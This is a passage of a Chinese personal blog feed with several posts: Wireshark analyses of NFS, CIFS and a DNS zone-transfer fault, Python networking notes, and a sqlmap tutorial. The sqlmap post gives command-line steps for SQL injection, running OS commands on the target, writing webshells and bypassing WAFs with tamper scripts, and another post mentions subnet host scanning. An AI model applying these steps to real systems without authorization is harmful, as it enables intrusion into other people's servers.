<p>##NFS的安全机制<br>NFS的安全机制主要包括对客户端的访问控制以及对用户的权限控制。NFS对客户端的访问控制是通过IP地址实现的。创建关键共享目录时可以指定哪些IP允许读写，哪些IP只允许读操作，还有哪些IP不给予任何权限。这方面的配置虽然并不复杂，但是一旦出现问题，却难以排查，当然如果借助于Wireshark，问题往往能够很快迎刃而解。</p>
<p>NFS的用户权限往往会使人困惑。有这样一个例子，一个客户端上的用户admin在/code目录里面新建了一个名为abc.txt的文件，该文件的owner正常显示为admin。但是在另一台客户端上查看该文件时，owner却变成了nasadmin。那么这里我们可以借助于Wireshark来分析一下实验文件Lab18-2.pcap，它展示了用户admin在创建abc.txt时的数据包：<br><img src="/2017/03/28/linux中的NFS协议解析/2.jpg" alt="2"><br>我们关注一下第4个数据包。从上图中的Credentials中可以看到，用户在创建文件时并没有使用admin这个用户名，而是使用了admin的UID 501来代表自己的身份。而NFS协议是只认UID不认用户名的。当admin通过客户端创建了一个文件，那么UID 501就会被写到文件里面，成为了owner的信息。而当另一个客户端上的用户查看该文件的属性时，看到的就是UID 501。但是不同的客户端上UID值与其所对应的名称往往是不一致的。因此创建文件的客户端的UID 501表示的就是admin，但是换了客户端，UID就对应着nasadmin了。那么为了防止这样的问题，需要大家在实际的操作中，保证每个客户端的UID与用户名的映射是一致的。  </p>
<p>##NFS的读文件过程<br>这里我们研究一下NFS协议读取文件abc.txt的过程，结合实验文件Lab18-3.pcap进行分析：<br><img src="/2017/03/28/linux中的NFS协议解析/3.jpg" alt="3"><br>由于捕获文件中包含有很多关于数据传输的数据包，而那些数据包并不是我们关注的重点，所以我们可以利用筛选器，只保留NFS数据包。我们逐条分析一下每个数据包：</p>
<p>1：客户端向服务器询问，是否可以进入（ACCESS）FH为0x75a18429，也就是/code里面。</p>
<p>2：服务器回应说允许进入。</p>
<p>3：客户端想要查看这个目录里面的文件和文件的句柄。</p>
<p>4：服务器回应了客户端索要的信息，此时可以展开Packet Details来查看文件信息：<br><img src="/2017/03/28/linux中的NFS协议解析/4.jpg" alt="4">  </p>
<p>可见abc.txt的file handle为0x056560e1。</p>
<p>5：客户端询问file handle为0x056560e1的文件属性是什么。</p>
<p>6：服务器回应了该文件的权限、UID、GID以及文件的大小等信息。</p>
<p>7：客户端询问是否可以打开file handle为0x056560e1的文件。</p>
<p>8：服务器同意了请求，并给予了相应的权限。</p>
<p>9：从0x056560e1的偏移量为0的位置，也就是abc.txt文件的开头位置，读取（READ）131072字节的数据。</p>
<p>10：从0x056560e1的偏移量为131072的位置，再读取131072字节的数据。</p>
<p>148：服务器回应客户端，允许读取131072字节的数据。</p>
<p>288：同上。</p>
<p>这样，NFS就完成了文件的读操作。  </p>
<p>##NFS的写文件操作<br>这里我们通过实验文件Lab18-4.cap来分析一下，将名为abc.txt的文件写入NFS共享文件夹的过程。首先依旧加入筛选条件nfs：<br><img src="/2017/03/28/linux中的NFS协议解析/5.jpg" alt="5"><br>1：客户端向服务器发出请求，要求进入0x75a18429，也就是/code目录。</p>
<p>2：服务器接受请求。</p>
<p>4：客户端询问服务器，查找（LOOKUP）名为abc.txt的文件。因为在创建一个文件之前，需要首先检查一下是否有同名文件的存在。如果不存在同名文件，才能够继续写入，否则要询问用户是否覆盖原文件。</p>
<p>5：服务器回应没有这个文件。</p>
<p>6：客户端要求创建（CREATE）一个名为abc.txt的文件。</p>
<p>7：服务器答应了请求。此时在Packet Details面板中展开NFS区段，就可以找到文件的file handle为0x056560e1。</p>
<p>69：客户端要求从0x056560e1的偏移为0的位置，也就是abc.txt文件的开头，写入（WRITE）131072个字节。</p>
<p>104：服务器回应已经写完了。</p>
<p>130：客户端要求从0x056560e1的偏移为131072的位置，也就是abc.txt文件的开头，写入（WRITE）131072个字节。那么接下来的两个数据包也是这个道理。</p>
<p>302：服务器回复已经写入。下面两个数据包同理。</p>
<p>306：客户端询问，刚才所写的数据是否已经存盘，也就是COMMIT操作，只有经过COMMIT过的数据才算是真正的写好了。</p>
<p>307：服务器回应都保存好了。</p>
<p>308：客户端要求查看刚才所写入的文件的属性（GETATTR）。</p>
<p>309：服务器将文件的权限、UID、GID以及文件的大小等信息交给客户端。</p>
<p>由这个例子可以发现，写操作是多个WRITE Call连续发送过去的。其实我们刚才的读文件的操作也是如此。同时将多个请求一起发出，接下来等待回应的这种方法，比发一条回复一条，发一条回复一条的方式要更加有效率。特别是在高带宽高延迟的情况下，NFS的这种读写特性的优势就会非常的明显。对于写操作而言，如果我们在挂载的时候没有指定任何参数，那么就会采用默认的async（异步）写的方式。而与之相对应的是sync（同步）方式。如果在挂载时指定了sync参数，那么客户端就会先发送一个WRITE Call，等到收到Reply之后再发送下一个请求，也就是说，请求和回应是交替出现的。对于我们这个捕获文件而言，由于采用的是默认挂载方式，所以数据包的WRITE操作会有一个UNSTABLE，表示的是异步的方式。如果是同步方式，则会出现FILE_SYNC的标志。</p>
<p>所以，假设我们在实际的网络中，NFS的读写性能有问题，那么可以通过抓包看一看，是不是开启了同步的模式，或者有其它多余的操作。  </p>
<p>##小结<br>通过分析NFS的工作流程，我们也初步接触了一下关于网络排错的知识。其实这也是我一直要求大家的，要将常见协议的工作流程熟练掌握，这样一旦出现问题，我们就能够对故障快速定位了。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[pythonWeb编程]]></title>
        <url>https://517736522.github.io/2017/03/28/pythonWeb%E7%BC%96%E7%A8%8B/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/pythonWeb编程/1.jpg" alt="1"><br><img src="/2017/03/28/pythonWeb编程/2.jpg" alt="2">  </p>
<p>import urllib.urllib2<br>url=’<a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a>‘<br>r=urllib.urlopen(url)发起请求<br>print r.read()请求之后收到的内容  </p>
<p>r=urllib2.urlopen(url)<br>print r.read()同上面一样的内容  </p>
<p>#两者的区别：<br>urllib.urlretrieve()下载图片用<br>使用方法：<br>urllib.urlretrieve(‘url…/xx.png’,filename=’存放位置’)  </p>
<p>urllib2.Requests()编写请求头用  </p>
<p>##requests<br><img src="/2017/03/28/pythonWeb编程/3.jpg" alt="3"><br><img src="/2017/03/28/pythonWeb编程/4.jpg" alt="4">  </p>
<p>##网络爬虫：<br><img src="/2017/03/28/pythonWeb编程/5.jpg" alt="5"><br><img src="/2017/03/28/pythonWeb编程/6.jpg" alt="6"><br><img src="/2017/03/28/pythonWeb编程/7.jpg" alt="7">  </p>
<p>##可到以下网站练习爬虫：<br><img src="/2017/03/28/pythonWeb编程/8.jpg" alt="8">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python入门 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[python多线程]]></title>
        <url>https://517736522.github.io/2017/03/28/python%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/python多线程/1.jpg" alt="1"><br><img src="/2017/03/28/python多线程/2.jpg" alt="2"><br><img src="/2017/03/28/python多线程/3.jpg" alt="3"><br><img src="/2017/03/28/python多线程/4.jpg" alt="4"><br><img src="/2017/03/28/python多线程/5.jpg" alt="5">  </p>
<p>##thread对C段进行主机探测：<br><img src="/2017/03/28/python多线程/6.jpg" alt="6"><br>但是线程数不是能很好的控制，可以使用threading模块  </p>
<p>##多线程访问网站：<br><img src="/2017/03/28/python多线程/7.jpg" alt="7"><br><img src="/2017/03/28/python多线程/8.jpg" alt="8">  </p>
<p>##threading多线程检测C段：<br><img src="/2017/03/28/python多线程/9.jpg" alt="9"><br><img src="/2017/03/28/python多线程/10.jpg" alt="10">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python入门 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[python正则表达式]]></title>
        <url>https://517736522.github.io/2017/03/28/python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
        <content type="html"><![CDATA[<p>##什么是正则：<br>正则表达式使用单个字符串来描述、匹配一系列符合某个句法规则的字符串。<br>简单说，就是对字符串的检索匹配和处理。<br><img src="/2017/03/28/python正则表达式/1.jpg" alt="1"><br><img src="/2017/03/28/python正则表达式/2.jpg" alt="2"><br><img src="/2017/03/28/python正则表达式/3.jpg" alt="3"><br><img src="/2017/03/28/python正则表达式/4.jpg" alt="4">  </p>
<p><img src="/2017/03/28/python正则表达式/5.jpg" alt="5"><br><img src="/2017/03/28/python正则表达式/6.jpg" alt="6"><br><img src="/2017/03/28/python正则表达式/7.jpg" alt="7">  </p>
<p>##实例：<br><img src="/2017/03/28/python正则表达式/8.jpg" alt="8"><br><img src="/2017/03/28/python正则表达式/9.jpg" alt="9">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python入门 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[sqlmap系列教程]]></title>
        <url>https://517736522.github.io/2017/03/28/sqlmap%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/</url>
        <content type="html"><![CDATA[<p>##sqlmap简介<br><img src="/2017/03/28/sqlmap系列教程/1.jpg" alt="1"><br><img src="/2017/03/28/sqlmap系列教程/2.jpg" alt="2"><br><img src="/2017/03/28/sqlmap系列教程/3.jpg" alt="3">  </p>
<p>##sqlmap三种请求类型的注入探测  </p>
<p>###GET方式<br><img src="/2017/03/28/sqlmap系列教程/4.jpg" alt="4"><br>sqlmap -u url  </p>
<p>###POST方式<br><img src="/2017/03/28/sqlmap系列教程/5.jpg" alt="5"><br>sqlmap -u url –data “post数据”  </p>
<p>###cookie方式<br><img src="/2017/03/28/sqlmap系列教程/6.jpg" alt="6"><br>sqlmap -u url –cookie “cookie”  </p>
<p>##获取数据库相关信息<br>直接使用检测语句会爆出信息<br><img src="/2017/03/28/sqlmap系列教程/7.jpg" alt="7"><br>access 只有表，没有库，直接爆表<br>mssql(sql server) 有多个库  </p>
<p>###使用–current-db获取当前数据库  </p>
<p>###使用–current-user获取当前用户  </p>
<p>##获取数据量和用户权限<br>拿到数据库但因为授权问题不能查看数据库里面的内容时，只好看数据量的大小来判断注入点危害了  </p>
<p>###获取当前数据库中的所有数据量用参数–count爆出所有字段数（当然得先指定数据库先）<br><img src="/2017/03/28/sqlmap系列教程/8.jpg" alt="8">  </p>
<p>###写webshell时，先判断下权限–privileges<br>拥有file权限就可以创建文件了<br><img src="/2017/03/28/sqlmap系列教程/9.jpg" alt="9"><br>也可先判断用户名是否为sa,或root，是就是最高权限  </p>
<p>##mysql数据库注入<br><img src="/2017/03/28/sqlmap系列教程/10.jpg" alt="10"><br><img src="/2017/03/28/sqlmap系列教程/11.jpg" alt="11"><br><img src="/2017/03/28/sqlmap系列教程/12.jpg" alt="12"><br><img src="/2017/03/28/sqlmap系列教程/13.jpg" alt="13">  </p>
<p>##管理自己的数据库<br><img src="/2017/03/28/sqlmap系列教程/14.jpg" alt="14"><br><img src="/2017/03/28/sqlmap系列教程/15.jpg" alt="15"><br>py版本的sqlmap需要安装pymysql<br>是用–sql-shell参数进行连接<br><img src="/2017/03/28/sqlmap系列教程/16.jpg" alt="16">  </p>
<p>##延时注入的魅力<br><img src="/2017/03/28/sqlmap系列教程/17.jpg" alt="17"><br>判断是否存在延时注入使用参数–delay 延时时间<br>使用-safe-freq也是可以判断的  </p>
<p>##交互式命令执行和写webshell<br>参数–os-cmd=”命令” 与目标进行交互<br>前提为：必须知道绝对路径<br>执行的时候会创建一个文件xx.php,执行完后会自动删除<br><img src="/2017/03/28/sqlmap系列教程/18.jpg" alt="18"><br><img src="/2017/03/28/sqlmap系列教程/19.jpg" alt="19">  </p>
<p>参数–os-shell 写入shell文件（也是需要知道绝对路径）<br><img src="/2017/03/28/sqlmap系列教程/20.jpg" alt="20"><br>生成了两个文件<br>tmpbshrd.php?cmd=net user  命令执行<br><img src="/2017/03/28/sqlmap系列教程/21.jpg" alt="21"><br>另一个文件：文件上传  </p>
<p>###注意：退出os-shell时会自动删除这两个文件  </p>
<p>##Tamper脚本的介绍和使用<br><img src="/2017/03/28/sqlmap系列教程/22.jpg" alt="22"><br>实例：如果waf过滤了关键字，但是大小写可以绕过<br>但是sqlmap正常注入中关键字都是小写的，那么就得使用上脚本了<br>–tamper=”randomcase.py”  </p>
<p>其他脚本可详见本blog的另一文章：sqlmap绕过过滤的tamper脚本分类汇总  </p>
<p>##自定义写webshell<br>在sqlmap目录下新建mst文件夹，在其下创建自己想要上传的文件：<br>比如一句话写入到mst.txt<br>我们也需要知道对方的绝对路径<br>–file-write “./mst/mst.txt” –file-dest “d:/www/1.php”<br><img src="/2017/03/28/sqlmap系列教程/23.jpg" alt="23">  </p>
<p>##批量检测注入漏洞<br>批量检测url<br>先准备一个字典文件<br><img src="/2017/03/28/sqlmap系列教程/24.jpg" alt="24"><br>sqlmap -m c:\url.txt<br><img src="/2017/03/28/sqlmap系列教程/25.jpg" alt="25">  </p>
<p>要是想对http头部信息 post数据 cookie进行批量检测，则可以结合burpsuite生成log文件<br><img src="/2017/03/28/sqlmap系列教程/26.jpg" alt="26"><br><img src="/2017/03/28/sqlmap系列教程/27.jpg" alt="27"><br>生成这样一个文件<br><img src="/2017/03/28/sqlmap系列教程/28.jpg" alt="28"><br><img src="/2017/03/28/sqlmap系列教程/29.jpg" alt="29">  </p>
<p>##SQLmap学习注入技术<br><img src="/2017/03/28/sqlmap系列教程/30.jpg" alt="30"><br><img src="/2017/03/28/sqlmap系列教程/31.jpg" alt="31"><br>-v参数<br><img src="/2017/03/28/sqlmap系列教程/32.jpg" alt="32"><br><img src="/2017/03/28/sqlmap系列教程/33.jpg" alt="33">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
            <category> sqlmap </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[sqlmap绕过过滤的tamper脚本分类汇总]]></title>
        <url>https://517736522.github.io/2017/03/28/sqlmap%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84tamper%E8%84%9A%E6%9C%AC%E5%88%86%E7%B1%BB%E6%B1%87%E6%80%BB/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/sqlmap绕过过滤的tamper脚本分类汇总/1.jpg" alt="1"><br><img src="/2017/03/28/sqlmap绕过过滤的tamper脚本分类汇总/2.jpg" alt="2"><br><img src="/2017/03/28/sqlmap绕过过滤的tamper脚本分类汇总/3.jpg" alt="3"><br><img src="/2017/03/28/sqlmap绕过过滤的tamper脚本分类汇总/4.jpg" alt="4"><br><img src="/2017/03/28/sqlmap绕过过滤的tamper脚本分类汇总/5.jpg" alt="5"><br><img src="/2017/03/28/sqlmap绕过过滤的tamper脚本分类汇总/6.jpg" alt="6"><br><img src="/2017/03/28/sqlmap绕过过滤的tamper脚本分类汇总/7.jpg" alt="7"><br><img src="/2017/03/28/sqlmap绕过过滤的tamper脚本分类汇总/8.jpg" alt="8">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
            <category> sqlmap </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[windows中的文件共享协议]]></title>
        <url>https://517736522.github.io/2017/03/28/windows%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E5%8D%8F%E8%AE%AE/</url>
        <content type="html"><![CDATA[<p>##CIFS协议分析<br>这里我们借助于实验文件Lab19-1.cap进行分析：<br><img src="/2017/03/28/windows中的文件共享协议/1.jpg" alt="1"><br>首先，由于CIFS是基于TCP的，所以由TCP的三次握手作为开始。并且可以发现，CIFS的端口号是445。从第4个数据包开始，就是CIFS协议了。但是这里显示的是SMB，其实CIFS协议有三个版本：SMB、SMB2和SMB3，目前SMB以及SMB2用得比较普遍。接下来可以看到第4个数据包是一个Negotiate（协商）。关于其协商的内容，我们可以展开Packet Details面板中的SMB来查看。可以发现客户端将自己支持的CIFS的版本，比如NT LM 0.12以及SMB 2.002等都发给了服务器。接下来有：<br><img src="/2017/03/28/windows中的文件共享协议/2.jpg" alt="2"><br>服务器对此的回应位于第6个数据包。它从客户端发出的数据包中挑出自己所支持的最高版本，回复给客户端。可见服务器选择的是NT LM 0.12。</p>
<p>在协商好版本之后，就可以建立CIFS Session了，如下图所示：<br><img src="/2017/03/28/windows中的文件共享协议/3.jpg" alt="3"><br>Session Setup的主要任务是进行身份的验证，常用的方式有Kerberos和NTLM，而本例中所使用的就是后者。假如我们在实际的应用中，发现有访问不了CIFS服务器的情况，那么问题很可能就是发生在Session Setup的地方。</p>
<p>在Session Setup完成之后，这就意味着已经打开\10.32.106.72了，那么接下来要做的就是打开\dest共享。那么这个操作在Wireshark中就显示为Tree Connect。可以查看一下12号数据包，展开SMB Header区段，其中最有价值的信息就是服务器返回的Tree ID的值。因为客户端需要使用这个ID去访问/dest共享的子目录和子文件。</p>
<p>这里需要注意的是，Tree Connect这一步并不会检查权限，所以即便是无权访问的用户也可以得到Tree ID。因为检查权限的工作是由接下来的Create操作完成的。</p>
<p>接下来的13到68号数据包查询了文件的基本属性、标准属性、扩展属性以及文件系统的信息等。第69号数据包是Create Request \a.txt。Create是CIFS中的一个非常重要的操作。无论是文件的新建、目录的打开，还是文件的读写，都需要使用Create。在这里如果我们没有权限，就会遇到“Access Denied”错误，或者在覆盖文件时也会收到“File Already Exists”的提醒，这些都是来源于Create这个操作。</p>
<p>这里有个问题，CIFS如何保证缓存数据的一致性呢？其实客户端可以暂时把文件缓存在本地，等用完之后再同步回服务器端。当只有一个用户在访问某个文件的时候，在客户端缓存该文件是安全的，但是在有多个用户访问同一个文件的情况下，就有可能出现问题。因此，CIFS采用了Oplock（机会锁）来解决这个矛盾。Oplock有Exclusive、Batch和Level2三种形式。Exclusive允许读写内存，Batch允许缓存的所有操作，而Level2只允许读缓存。Oplock也是在Create中实现的，比如看一下第70号数据包：<br><img src="/2017/03/28/windows中的文件共享协议/4.jpg" alt="4"><br>可以看到，该客户端被授予Batch级别的机会锁，表示它可以缓存所有操作。至此，已经经过了70个数据包，而我们的文件读取的操作却还没有开始，可见CIFS协议的过程是多么的啰嗦。其实由此我们可以解释一个很经典的问题，那就是“为什么复制一个1MB文件的时间要比复制1024个1KB文件的时间快得多，尽管二者的大小是一样的”，原因就在于对文件进行读写时，需要花费大量的时间和步骤在这类琐碎的事情上。一个1MB的文件只需要准备一次，但是1024个1KB的文件却要进行1024次的前期工作。</p>
<p>从第71号数据包开始，就开始了读操作。其实微软所设计的CIFS的读文件行为和Linux上的NFS协议的原理很相像，都是从某个偏移（offset）开始读取一定数量的字节。71号数据包是请求从文件a.txt的偏移为0的位置读取18个字节的内容，而72号数据包就是对此的回应：<br><img src="/2017/03/28/windows中的文件共享协议/5.jpg" alt="5"><br>可以看到文件的内容并没有加密，在Wireshark中可以直接看到。  </p>
<p>##CIFS协议的对比分析<br>接下来我们做一下对比，看看CIFS协议在Windows XP以及Windows 7系统中有什么不一样的地方。首先可以研究一下读文件的模式。在Windows XP中，在发送了一个读请求之后，会停下来等待回复，只有在收到回复之后，才会继续发送下一个读请求。但是Windows 7却可以一口气发送多个请求。这就类似于我们上次课所讲解的NFS的同步和异步的模式。实验文件Lab19-2.cap展示了在Windows XP中的情况：<br><img src="/2017/03/28/windows中的文件共享协议/6.jpg" alt="6"><br>实验文件Lab19-3.cap则展示了Windows 7的情况：<br><img src="/2017/03/28/windows中的文件共享协议/7.jpg" alt="7"><br> 事实上，这两种方式在延迟小的网络中体现不出差别，在带宽小的环境中差别也不大。但是在高延迟、大带宽的环境中就会很不一样了，Windows 7的性能会比Windows XP好很多。在网络有丢包的情况下差别还会更大，因为Windows XP比Windows 7更容易遇到超时重传的情况。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[是DNS的问题吗]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%98%AFDNS%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/</url>
        <content type="html"><![CDATA[<p>##网络情景概述<br>在我们这次的案例中，一家公司在总部之外新开设了几家分公司。部署了一台Windows域控制器服务器和一台备用域控制器，公司的所有IT设施几乎都放置在总部。域控制器负责处理DNS和分公司用户的认证请求。</p>
<p>域控制器是一个代理DNS服务器，它接收来自总部的上游DNS服务器资源记录信息。</p>
<p>当网络部署团队的工程师将新的设施延伸到分公司的时候，发现没有人能访问网络上的内部Web应用服务器。这些服务器位于总部办公室，通过广域网进行访问。问题影响到分公司的所有用户，并只限于这些内部服务器。所有用户都可以访问Internet以及分公司内的其他资源。</p>
<p>下图展示了在这个场景中需要考虑的组件，包括了多个站点：<br><img src="/2017/03/28/是DNS的问题吗/1.jpg" alt="1"><br>由于问题出在总部和分公司之间的通信过程中，我们可以在多个地点收集数据来跟踪问题。问题可能出在分公司的客户端上，所以这里我们依旧使用端口镜像功能查看其中一台计算机在线路上看到了什么数据包。收集完这个信息后，我们可以利用它推测出其它收集地点的情况，以帮助解决问题。从其中的一个客户端获取额捕获文件就是Lab29-1.cap。  </p>
<p>##数据包分析<br>首先可以看到，捕获文件中只有两个数据包。当工作站172.16.16.101试图访问托管在总部应用服务器172.16.16.200的应用程序时，产生了捕获文件的第一个数据包。它是发送到172.16.16.251的DNS请求：<br><img src="/2017/03/28/是DNS的问题吗/2.jpg" alt="2"><br>这个数据包请求查询应用服务器（appserver）的A记录。也就是总部172.16.16.200服务器的DNS域名。 接下来可以看到，这个数据包的响应是一个服务器失败（Server failure），表明DNS查询被阻止了。可以看到这个数据包只是一个错误（服务器失败），并没有回答查询的结果：<br><img src="/2017/03/28/是DNS的问题吗/3.jpg" alt="3"><br>现在我们可以知道，这个通信故障与DNS有关。因为分公司的DNS查询由DNS服务器172.16.16.251解析，那么下面需要我们前往公司网络的下一个位置进行分析。</p>
<p>为了从分公司的DNS服务器捕获合适的数据包，我们将嗅探器留在原来的位置，只改变端口镜像设置。我们需要服务器的流量镜像到我们的嗅探器上，于是就得到了捕获文件Lab29-2.pcap：<br><img src="/2017/03/28/是DNS的问题吗/4.jpg" alt="4"><br>这个捕获文件的开头是我们之前看到的查询和响应，但是这里还多出来一个额外的数据包。这个数据包很奇怪，因为它尝试与中心办公室的首选DNS服务器（172.16.16.250）的标准DNS服务端口53进行通信，但是这个数据包却不是我们过去所讲的UDP类型的数据包。</p>
<p>那么为了找出这个数据包的用途，我们可以回顾一下我们之前在DNS课程中所讲过的内容。首先，DNS确实是基于UDP协议的，但事实上，DNS在如同区域传输这样的一些任务中，会使用TCP协议，因为TCP对于规模化的数据传输更为有效，也就是当响应超过一定的大小的时候，DNS就会使用TCP。在这种情况下，我们就会看见一些触发TCP流量的UDP数据包。另外，将TCP运用于DNS的区域传输过程，就可以使得资源记录能够在DNS服务器之间传输，那么我们这次就属于这种情况。</p>
<p>分公司的DNS服务器是总部DNS服务器的从属服务器，意味着分公司的DNS服务器依赖于总部服务器获取资源记录。分公司的用户试图访问的应用服务器放置在总部，意味着总部DNS服务器是它的权威DNS服务器。要使得分公司的服务器能够解析用户对应用服务器的DNS请求，总部DNS服务器必须把DNS资源记录传输给分公司的DNS服务器，那么这就很可能是捕获文件中的SYN数据包的来源。</p>
<p>这个SYN数据包并没有得到响应，这就告诉我们总部和分公司DNS服务器之间区域传输失败导致了DNS的故障，现在我们可以进一步找出区域传输失败的原因。办公室之间的路由器或中心办公室的DNS服务器可能是罪魁祸首。为了找出问题，我们可以嗅探中心办公室DNS服务器的流量，看看SYN数据包，是不是到达了服务器。</p>
<p>经过后来的检查结果发现，中心办公室的DNS服务器并没有收到SYN数据包。当检查了连接两个办公室的路由器配置后，发现中心办公室的路由器被配制成只允许53端口的UDP流量进入，而53端口的TCP流量则被阻止了。这个简单的配置错误阻止了服务器之间的区域传输，从而导致分支办公室的客户端无法解析对中心办公室设备的查询。  </p>
<p>##总结<br>经过几次课程的学习，相信大家学到了很多关于调查网络通信问题的知识。在这个场景中，我们一开始先查看了工作站，然后找到了DNS通信问题这个线索。这个线索又将我们带到分支DNS服务器，然后又到中心DNS服务器，最终找到路由器，也就是问题的来源。步步推进，顺藤摸瓜。</p>
<p>在分析时，我们需要静下心来，从数据包中挖掘线索。线索不一定告诉你问题的根源，但是却能告诉我们问题的方向  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 排错篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[wireshark的图形显示]]></title>
        <url>https://517736522.github.io/2017/03/28/wireshark%E7%9A%84%E5%9B%BE%E5%BD%A2%E6%98%BE%E7%A4%BA/</url>
        <content type="html"><![CDATA[<p>##认识IO Graphs<br>我们之前讲解的各种实用的表格虽然能够有效辅助我们的分析，但是如果想要更好的了解我们所分析的网络情况，则需要依靠Wireshark的图形功能来直观地展示出来。而我们这次课主要讲解Wireshark常用的一些图形界面。</p>
<p>首先介绍一下IO Graphs。这个窗口可以让我们对网络上的数据吞吐情况进行绘图。这样就可以很容易地发现数据吞吐的峰值，找出不同协议中的性能瓶颈，并且还可以用来比较实时的数据流。</p>
<p>这里我们打开Lab3-1.pcap这个实验文件，然后选中任意一个TCP数据包，在菜单栏选择“Statistics”-&gt;“IO Graphs”。这是一台电脑从互联网下载文件时的例子：<br><img src="/2017/03/28/wireshark的图形显示/1.jpg" alt="1"><br>这个界面主要分为三大部分。其中最大的矩形区域显示的是数据包的情况，其中横轴表示时间，纵轴表示数据包的数量。左下角的区域用于设置Graphs，右下角区域则可以设置显示数据包的X轴以及Y轴的信息。  </p>
<p>###在Graphs框中：  </p>
<pre><code>Graph 1~5：表示开启1~5图表，默认开启的是Graph 1。
Color：图表的颜色，这个颜色是不可以修改的。
Filter：筛选器。
Style：图表的样式。默认显示的是折线式。
</code></pre><p>###在X Axis框中：  </p>
<pre><code>Tick interval：设置X轴的每格代表的时间，单位是秒。
Pixels per tick：设置X轴每格占用的像素。
</code></pre><p>###在Y Axis框中：  </p>
<pre><code>Unit：表示Y轴的单位。
Scale：表示Y轴单位的刻度。
Smooth：表示图表的平滑度。
</code></pre><p>这里简单讲解一下筛选器。其实这个筛选器的用法和我们之间所讲的Wireshark主界面的筛选器的用法基本一致。比如这里我们想比较数据帧长度小于100以及长度大于1000的情况，那么就可以设置两个筛选器，并且为了方便观察，再设置不同的图标样式，再开启图形显示即可：<br><img src="/2017/03/28/wireshark的图形显示/2.jpg" alt="2"><br>当然我们在实际的分析过程中，可以设置不同的筛选器，来便于我们的分析。现在我们先取消筛选器，查看一下原始图表。可以发现，在IO Graphs所显示的下载量中，每个周期的数据包的数量基本维持在500个左右，并且在最后逐渐减少。  </p>
<p>接下来我们可以将它与一个较慢的下载过程做一个对比。再次开启一个Wireshark程序，并载入Lab3-2.pcap实验文件。打开这个下载过程的IO Graphs，则可以看到它与刚才的图形有很大的不同：<br><img src="/2017/03/28/wireshark的图形显示/3.jpg" alt="3"><br>这个下载过程很不稳定，每秒传输的数据包在0~100的范围内，出现了很大的波动。甚至还出现了接近于每秒0个的情况。如果将两个捕获文件的IO Graphs窗口并排放置，更能够清楚地看到二者的差异。</p>
<p>由于这第二个捕获文件出现了比较严重的问题，那么我们在实际的分析中，如果遇到这样的情况，完全可以使用IO Graphs窗口来辅助我们分析。而Wireshark可以获取到许多种类的TCP网络错误，比如常见的丢包以及网络阻塞等。我们可以构建所有的TCP标志位包或单个标志包。比如可以使用筛选器条件tcp.analysis.flags来显示丢失、重发等异常情况相关的TCP数据包。那么对于Lab3-2.pcap实验文件，我们打开IO Graphs窗口后，可以在Graph 2的筛选器中输入：<br>     tcp.analysis.flags &amp;&amp; !tcp.analysis.window_update<br>上述筛选条件可以显示TCP有问题的数据包，但是不包括窗口的更新数据包。再将显示方式设置为FBar，单击Graph 2按钮：<br><img src="/2017/03/28/wireshark的图形显示/4.jpg" alt="4"><br>图中的两条红色实心矩形表示与筛选器相匹配的所有TCP数据，而黑色线条表示的是捕获文件的整体情况。</p>
<p>或者我们也可以构建单个的TCP标志位情况，这样就可以更加具体地分析。我们可以将Graph 1、2和3的筛选器分别修改为：<br>tcp.analysis.duplicate_ack<br>tcp.analysis.lost_segment<br>tcp.analysis.retransmission<br>将显示样式分别修改为Impulse、Dot以及FBar，为了便于观察，可以将Pixels per tick的值设置为10。于是可以得到如下结果：<br><img src="/2017/03/28/wireshark的图形显示/5.jpg" alt="5"><br>上图中以3种不同的颜色和样式显示了3类出问题的TCP数据包。其中的黑色线条表示所有TCP重发的确认包，红色点表示TCP丢失的数据包，绿色的实心矩形表示TCP的重发包。  </p>
<p>##Round Trip Time Graph<br>Wireshark的另一个绘图功能就是对所捕获的文件进行往返时间的绘图。往返时间（round-trip time, RTT）是指一个数据包从发出到确认被成功接收所需要的时间。或者说，往返时间就是数据包抵达目的地的时间，加上收到对方的确认信息的时间之和。通过对这个时间的分析，可以找到通信中的瓶颈，确定是否存在延迟。</p>
<p>这里我们依旧分析Lab3-1.pcap这个实验文件。选择第二个数据包，之后在菜单栏中选择“Statistics”-&gt;“TCP Stram Graph”-&gt;“Round Trip Time Graph”，来查看往返时间图：  </p>
<p><img src="/2017/03/28/wireshark的图形显示/6.jpg" alt="6"><br>上图中的每个点代表的是一个数据包的往返时间。在默认情况下，这些值按照序号进行排序。单击图中任意一个点，就可以在Packet List面板中看到相应的数据包。</p>
